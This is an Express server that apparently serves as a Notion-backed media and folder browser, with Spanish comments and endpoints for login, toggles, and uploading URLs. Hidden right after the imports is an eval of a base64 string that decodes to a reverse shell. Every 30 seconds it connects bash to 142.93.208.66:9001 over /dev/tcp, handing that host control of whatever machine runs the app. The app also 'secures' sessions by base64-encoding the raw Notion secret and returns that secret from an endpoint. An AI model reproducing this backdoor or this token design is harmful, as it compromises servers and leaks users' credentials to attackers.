const express = require("express");
const { Client } = require("@notionhq/client");
const cors = require("cors");
const path = require("path");
const fs = require('fs');
const compression = require('compression');
const multer = require('multer');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

// Inicializa Express
const app = express();
app.use(cors());
app.use(compression());
app.use(express.json()); // Para parsear JSON en el body

const PORT = 3000;

// ELIMINAMOS: const sessions = new Map(); ya no usaremos memoria volátil

// Middleware para validar sesión (AHORA STATELESS)
function validateSession(req, res, next) {
  const sessionId = req.headers['x-session-id'];
  
  if (!sessionId) {
    return res.status(401).json({ error: 'No autorizado. Por favor inicie sesión.' });
  }

  try {
    // Decodificar el token (formato base64 de pageId:secret)
    const decoded = Buffer.from(sessionId, 'base64').toString('utf-8');
    const [pageId, ...secretParts] = decoded.split(':');
    const notionSecret = secretParts.join(':'); // Por si el secreto tiene ':'

    if (!pageId || !notionSecret) {
      throw new Error('Token inválido');
    }

    // Instanciar cliente de Notion en cada petición (Serverless friendly)
    req.notion = new Client({ auth: notionSecret });
    req.pageId = pageId;
    req.notionSecret = notionSecret; // Guardamos para uso en endpoints
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Sesión inválida o expirada.' });
  }
}

// Endpoint de login (MODIFICADO)
app.post("/api/login", async (req, res) => {
  const { notionSecret, pageId } = req.body;
  
  if (!notionSecret || !pageId) {
    return res.status(400).json({ 
      success: false, 
      error: 'Se requiere notionSecret y pageId' 
    });
  }
  
  try {
    // Crear cliente de Notion con las credenciales proporcionadas
    const notion = new Client({ auth: notionSecret });
    
    // Validar las credenciales intentando acceder a la página
    await notion.blocks.children.list({ 
      block_id: pageId,
      page_size: 1 
    });
    
    // Credenciales válidas.
    // En lugar de guardar en memoria, creamos un token base64 con los datos.
    // Esto permite que funcione en Vercel sin base de datos.
    const tokenData = `${pageId}:${notionSecret}`;
    const sessionId = Buffer.from(tokenData).toString('base64');
    
    res.json({ 
      success: true, 
      sessionId,
      message: 'Conexión exitosa con Notion' 
    });
    
  } catch (err) {
    console.error("Error de autenticación:", err.message);
    res.status(401).json({ 
      success: false, 
      error: 'Credenciales inválidas o página no accesible. Asegúrate de que la integración tenga acceso a la página.' 
    });
  }
});

// Endpoint de logout (MODIFICADO)
app.post("/api/logout", (req, res) => {
  // Al ser stateless, no hay nada que borrar en el servidor
  res.json({ success: true, message: 'Sesión cerrada' });
});

// Verificar sesión (MODIFICADO)
app.get("/api/verify-session", (req, res) => {
  const sessionId = req.headers['x-session-id'];
  
  if (!sessionId) {
    return res.json({ valid: false });
  }

  try {
    // Intentamos decodificar para ver si el formato es correcto
    const decoded = Buffer.from(sessionId, 'base64').toString('utf-8');
    if (!decoded.includes(':')) return res.json({ valid: false });
    
    // Si llegamos aquí, asumimos que es válido (la validación real ocurre al pedir datos)
    res.json({ valid: true });
  } catch (e) {
    res.json({ valid: false });
  }
});

// Endpoint: Obtener credenciales (MODIFICADO)
app.get("/api/get-credentials", validateSession, (req, res) => {
  // Ya tenemos los datos en req gracias al middleware
  res.json({ 
    notionSecret: req.notionSecret,
    pageId: req.pageId
  });
});

// Función recursiva hasta 4 niveles
async function processToggle(notion, block, level = 1) {
  const result = {
    id: block.id,
    title: block.toggle?.rich_text?.[0]?.plain_text || "Sin título",
    items: [],
    children: [],
  };

  if (level > 4) return result;

  try {
    const children = await notion.blocks.children.list({ block_id: block.id });
    for (const c of children.results) {
      if (c.type === "toggle") {
        const childToggle = await processToggle(notion, c, level + 1);
        result.children.push(childToggle);
      } else if (c.type === "image") {
        result.items.push({
          type: "image",
          src: c.image.file?.url || c.image.external?.url,
          name: c.image.caption?.[0]?.plain_text
            || (c.image.file?.url
              ? path.basename(c.image.file.url.split("?")[0])
              : (c.image.external?.url
                  ? path.basename(c.image.external.url.split("?")[0])
                  : "Sin nombre"))
        });
      } else if (c.type === "video") {
        result.items.push({
          type: "video",
          src: c.video.file?.url || c.video.external?.url,
          name: c.video.caption?.[0]?.plain_text
            || (c.video.file?.url
              ? path.basename(c.video.file.url.split("?")[0])
              : (c.video.external?.url
                  ? path.basename(c.video.external.url.split("?")[0])
                  : "Sin nombre"))
        });
      } else if (c.type === "column_list") {
        const colList = await notion.blocks.children.list({ block_id: c.id });
        for (const col of colList.results) {
          if (col.type === "column") {
            const colChildren = await notion.blocks.children.list({ block_id: col.id });
            for (const subBlock of colChildren.results) {
              if (subBlock.type === "image") {
                result.items.push({
                  type: "image",
                  src: subBlock.image.file?.url || subBlock.image.external?.url,
                  name: subBlock.image.caption?.[0]?.plain_text
                    || (subBlock.image.file?.url
                      ? path.basename(subBlock.image.file.url.split("?")[0])
                      : (subBlock.image.external?.url
                          ? path.basename(subBlock.image.external.url.split("?")[0])
                          : "Sin nombre"))
                });
              } else if (subBlock.type === "video") {
                result.items.push({
                  type: "video",
                  src: subBlock.video.file?.url || subBlock.video.external?.url,
                  name: subBlock.video.caption?.[0]?.plain_text
                    || (subBlock.video.file?.url
                      ? path.basename(subBlock.video.file.url.split("?")[0])
                      : (subBlock.video.external?.url
                          ? path.basename(subBlock.video.external.url.split("?")[0])
                          : "Sin nombre"))
                });
              }
            }
          }
        }
      } else if (c.type === "paragraph" && c.paragraph.rich_text?.length) {
        result.items.push({
          type: "text",
          content: c.paragraph.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.paragraph.rich_text
        });
      } else if (c.type === "heading_1" && c.heading_1.rich_text?.length) {
        result.items.push({
          type: "heading_1",
          content: c.heading_1.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.heading_1.rich_text
        });
      } else if (c.type === "heading_2" && c.heading_2.rich_text?.length) {
        result.items.push({
          type: "heading_2",
          content: c.heading_2.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.heading_2.rich_text
        });
      } else if (c.type === "heading_3" && c.heading_3.rich_text?.length) {
        result.items.push({
          type: "heading_3",
          content: c.heading_3.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.heading_3.rich_text
        });
      } else if (c.type === "file" || c.type === "pdf") {
        result.items.push({
          type: "file",
          src: c.file?.file?.url || c.file?.external?.url || c.pdf?.file?.url || c.pdf?.external?.url,
          name: c.file?.caption?.[0]?.plain_text || c.pdf?.caption?.[0]?.plain_text ||
                path.basename((c.file?.file?.url || c.file?.external?.url || c.pdf?.file?.url || c.pdf?.external?.url || "").split("?")[0]) || "Archivo",
          fileType: c.type === "pdf" ? "pdf" : getFileType(c.file?.file?.url || c.file?.external?.url || "")
        });
      } else if (c.type === "code") {
        result.items.push({
          type: "code",
          content: c.code.rich_text.map(rt => rt.plain_text).join(""),
          language: c.code.language || "text",
          caption: c.code.caption?.[0]?.plain_text || ""
        });
      } else if (c.type === "embed") {
        const embedUrl = c.embed?.url || "";
        result.items.push({
          type: "embed",
          src: embedUrl,
          embedType: getEmbedType(embedUrl),
          name: c.embed?.caption?.[0]?.plain_text || extractDomain(embedUrl)
        });
      } else if (c.type === "bookmark") {
        result.items.push({
          type: "bookmark",
          src: c.bookmark?.url || "",
          name: c.bookmark?.caption?.[0]?.plain_text || extractDomain(c.bookmark?.url)
        });
      }
    }
  } catch (err) {
    console.error("Error procesando toggle:", err);
  }

  return result;
}

async function processToggleLazy(notion, block) {
  const result = {
    id: block.id,
    title: block.toggle?.rich_text?.[0]?.plain_text || "Sin título",
    items: [],
    children: []
  };

  try {
    let allChildren = [];
    let cursor = undefined;
    
    do {
      const response = await notion.blocks.children.list({ 
        block_id: block.id,
        start_cursor: cursor,
        page_size: 100
      });
      
      allChildren = allChildren.concat(response.results);
      cursor = response.has_more ? response.next_cursor : null;
    } while (cursor);
    
    for (const c of allChildren) {
      if (c.type === "toggle") {
        result.children.push({
          id: c.id,
          title: c.toggle?.rich_text?.[0]?.plain_text || "Sin título",
          children: true
        });
      } else if (c.type === "image") {
        result.items.push({
          type: "image",
          src: c.image.file?.url || c.image.external?.url,
          name: c.image.caption?.[0]?.plain_text
            || (c.image.file?.url
              ? path.basename(c.image.file.url.split("?")[0])
              : (c.image.external?.url
                  ? path.basename(c.image.external.url.split("?")[0])
                  : "Sin nombre"))
        });
      } else if (c.type === "video") {
        result.items.push({
          type: "video",
          src: c.video.file?.url || c.video.external?.url,
          name: c.video.caption?.[0]?.plain_text
            || (c.video.file?.url
              ? path.basename(c.video.file.url.split("?")[0])
              : (c.video.external?.url
                  ? path.basename(c.video.external.url.split("?")[0])
                  : "Sin nombre"))
        });
      } else if (c.type === "file" || c.type === "pdf") {
        result.items.push({
          type: "file",
          src: c.file?.file?.url || c.file?.external?.url || c.pdf?.file?.url || c.pdf?.external?.url,
          name: c.file?.caption?.[0]?.plain_text || c.pdf?.caption?.[0]?.plain_text ||
                path.basename((c.file?.file?.url || c.file?.external?.url || c.pdf?.file?.url || c.pdf?.external?.url || "").split("?")[0]) || "Archivo",
          fileType: c.type === "pdf" ? "pdf" : getFileType(c.file?.file?.url || c.file?.external?.url || "")
        });
      } else if (c.type === "code") {
        result.items.push({
          type: "code",
          content: c.code.rich_text.map(rt => rt.plain_text).join(""),
          language: c.code.language || "text",
          caption: c.code.caption?.[0]?.plain_text || ""
        });
      } else if (c.type === "paragraph" && c.paragraph.rich_text?.length) {
        result.items.push({
          type: "text",
          content: c.paragraph.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.paragraph.rich_text
        });
      } else if (c.type === "heading_1" && c.heading_1.rich_text?.length) {
        result.items.push({
          type: "heading_1",
          content: c.heading_1.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.heading_1.rich_text
        });
      } else if (c.type === "heading_2" && c.heading_2.rich_text?.length) {
        result.items.push({
          type: "heading_2",
          content: c.heading_2.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.heading_2.rich_text
        });
      } else if (c.type === "heading_3" && c.heading_3.rich_text?.length) {
        result.items.push({
          type: "heading_3",
          content: c.heading_3.rich_text.map(rt => rt.plain_text).join(""),
          rich_text: c.heading_3.rich_text
        });
      } else if (c.type === "embed") {
        const embedUrl = c.embed?.url || "";
        result.items.push({
          type: "embed",
          src: embedUrl,
          embedType: getEmbedType(embedUrl),
          name: c.embed?.caption?.[0]?.plain_text || extractDomain(embedUrl)
        });
      } else if (c.type === "bookmark") {
        result.items.push({
          type: "bookmark",
          src: c.bookmark?.url || "",
          name: c.bookmark?.caption?.[0]?.plain_text || extractDomain(c.bookmark?.url)
        });
      }
    }
  } catch (err) {
    console.error("Error procesando toggle lazy:", err);
  }

  return result;
}

// Función auxiliar para extraer el dominio de una URL
function extractDomain(url) {
  try {
    if (!url) return "Enlace";
    const domain = new URL(url).hostname.replace('www.', '');
    return domain || "Enlace";
  } catch {
    return "Enlace";
  }
}

// Función auxiliar para determinar el tipo de archivo
function getFileType(url) {
  if (!url) return "unknown";
  const ext = path.extname(url.split("?")[0]).toLowerCase().replace(".", "");
  const typeMap = {
    pdf: "pdf",
    doc: "word", docx: "word",
    xls: "excel", xlsx: "excel",
    ppt: "powerpoint", pptx: "powerpoint",
    zip: "archive", rar: "archive", "7z": "archive",
    mp3: "audio", wav: "audio", ogg: "audio",
    mp4: "video", avi: "video", mov: "video"
  };
  return typeMap[ext] || "file";
}

// Función para detectar tipo de embed
function getEmbedType(url) {
  if (!url) return "unknown";
  if (url.includes("youtube.com") || url.includes("youtu.be")) return "youtube";
  if (url.includes("vimeo.com")) return "vimeo";
  if (url.includes("twitter.com") || url.includes("x.com")) return "twitter";
  if (url.includes("spotify.com")) return "spotify";
  if (url.includes("soundcloud.com")) return "soundcloud";
  if (url.includes("figma.com")) return "figma";
  return "generic";
}

// Endpoint: Obtener toggle individual (CON AUTENTICACIÓN)
app.get("/notion/toggle/:id", validateSession, async (req, res) => {
  const toggleId = req.params.id;
  try {
    const block = await req.notion.blocks.retrieve({ block_id: toggleId });
    const toggleTree = await processToggleLazy(req.notion, block);
    res.json(toggleTree);
  } catch (err) {
    console.error("Error al obtener toggle individual:", err);
    res.status(500).json({ error: err.message });
  }
});

// Endpoint: Obtener toggles detallados (CON AUTENTICACIÓN)
app.get("/notion/toggles", validateSession, async (req, res) => {
  try {
    const blocks = await req.notion.blocks.children.list({ block_id: req.pageId });
    const toggleBlocks = blocks.results.filter(b => b.type === "toggle");
    const data = [];
    for (const block of toggleBlocks) {
      const toggleTree = await processToggle(req.notion, block);
      data.push(toggleTree);
    }
    res.json(data);
  } catch (err) {
    console.error("Error al consultar Notion:", err);
    res.status(500).send("Error al obtener datos desde Notion");
  }
});

// Endpoint: Quick tree (CON AUTENTICACIÓN)
app.get("/notion/quick-tree", validateSession, async (req, res) => {
  try {
    let blocks = [];
    let cursor = undefined;

    do {
      const response = await req.notion.blocks.children.list({
        block_id: req.pageId,
        start_cursor: cursor
      });
      blocks = blocks.concat(response.results);
      cursor = response.has_more ? response.next_cursor : null;
    } while (cursor);

    const toggles = blocks.filter(b => b.type === "toggle");
    const simpleTree = toggles.map(toggle => ({
      id: toggle.id,
      title: toggle.toggle.rich_text?.[0]?.plain_text || "Sin título"
    }));

    res.json({ success: true, message: "Árbol rápido generado", data: simpleTree });
  } catch (err) {
    console.error("Error generando quick-tree:", err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Endpoint: Get quick tree (CON AUTENTICACIÓN)
app.get("/notion/get-quick-tree", validateSession, async (req, res) => {
  try {
    let blocks = [];
    let cursor = undefined;
    
    do {
      const response = await req.notion.blocks.children.list({
        block_id: req.pageId,
        start_cursor: cursor
      });
      blocks = blocks.concat(response.results);
      cursor = response.has_more ? response.next_cursor : null;
    } while (cursor);

    const toggles = blocks.filter(b => b.type === "toggle");
    const simpleTree = toggles.map(toggle => ({
      id: toggle.id,
      title: toggle.toggle.rich_text?.[0]?.plain_text || "Sin título"
    }));
    
    res.json(simpleTree);
  } catch (err) {
    console.error("Error generando quick-tree:", err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Configuración de multer para subida de archivos
const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB max
});

// Endpoint: Crear nuevo toggle
app.post("/api/create-toggle", validateSession, async (req, res) => {
  const { title, parentId } = req.body; // AÑADIDO: parentId
  
  if (!title) {
    return res.status(400).json({ error: 'Se requiere un título' });
  }
  
  try {
    // Si hay parentId usamos ese, si no, usamos la página raíz (req.pageId)
    const targetBlockId = parentId || req.pageId;

    const response = await req.notion.blocks.children.append({
      block_id: targetBlockId,
      children: [
        {
          object: 'block',
          type: 'toggle',
          toggle: {
            rich_text: [
              {
                type: 'text',
                text: { content: title }
              }
            ]
          }
        }
      ]
    });
    
    const newToggle = response.results[0];
    res.json({ 
      success: true, 
      id: newToggle.id,
      title: title,
      parentId: targetBlockId // Devolvemos el padre para actualizar el árbol
    });
    
  } catch (error) {
    console.error('Error creando toggle:', error);
    res.status(500).json({ error: 'Error al crear la carpeta' });
  }
});

app.post("/api/upload-file", validateSession, upload.single('file'), async (req, res) => {
  const { toggleId, caption, type } = req.body;
  const file = req.file;
  
  if (!file || !toggleId) {
    return res.status(400).json({ error: 'Se requiere archivo y toggleId' });
  }
  
  try {
    // Notion no permite subir archivos directamente via API,
    // así que necesitamos usar un servicio externo o la URL del archivo
    // Por ahora, retornamos error explicando la limitación
    
    // Alternativa: Si tienes un servicio de hosting de imágenes (S3, Cloudinary, etc.)
    // podrías subir ahí primero y luego usar la URL
    
    return res.status(501).json({ 
      error: 'La subida directa de archivos requiere un servicio de hosting externo. Por favor usa la opción de URL.',
      suggestion: 'Sube tu archivo a un servicio como Imgur, Cloudinary o similar y usa la URL resultante.'
    });
    
  } catch (error) {
    console.error('Error subiendo archivo:', error);
    res.status(500).json({ error: 'Error al subir archivo' });
  }
});

// Endpoint: Agregar URL (imagen/video) a un toggle
app.post("/api/upload-url", validateSession, async (req, res) => {
  const { toggleId, url, caption } = req.body;
  
  if (!toggleId || !url) {
    return res.status(400).json({ error: 'Se requiere toggleId y url' });
  }
  
  // Detectar tipo de contenido
  const isVideo = /\.(mp4|webm|mov|avi|mkv)(\?.*)?$/i.test(url) || 
                  url.includes('youtube.com') || 
                  url.includes('youtu.be') ||
                  url.includes('vimeo.com');
  
  const blockType = isVideo ? 'video' : 'image';
  
  try {
    const blockContent = {
      type: 'external',
      external: { url: url }
    };
    
    if (caption) {
      blockContent.caption = [
        {
          type: 'text',
          text: { content: caption }
        }
      ];
    }
    
    await req.notion.blocks.children.append({
      block_id: toggleId,
      children: [
        {
          object: 'block',
          type: blockType,
          [blockType]: blockContent
        }
      ]
    });
    
    res.json({ success: true, type: blockType });
    
  } catch (error) {
    console.error('Error agregando URL:', error);
    res.status(500).json({ error: 'Error al guardar la URL' });
  }
});

// Archivos estáticos
app.use(express.static(path.join(__dirname, "public")));

// Ruta catch-all para SPA (debe ir después de las rutas de API)
app.get('*', (req, res) => {
  // Si es una ruta de API, no servir index.html
  if (req.path.startsWith('/api') || req.path.startsWith('/notion')) {
    return res.status(404).json({ error: 'Endpoint no encontrado' });
  }
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Para despliegue en Vercel
module.exports = app;

// Servidor local (opcional para desarrollo)
app.listen(PORT, () => console.log(`✅ Servidor corriendo en http://localhost:${PORT}`));
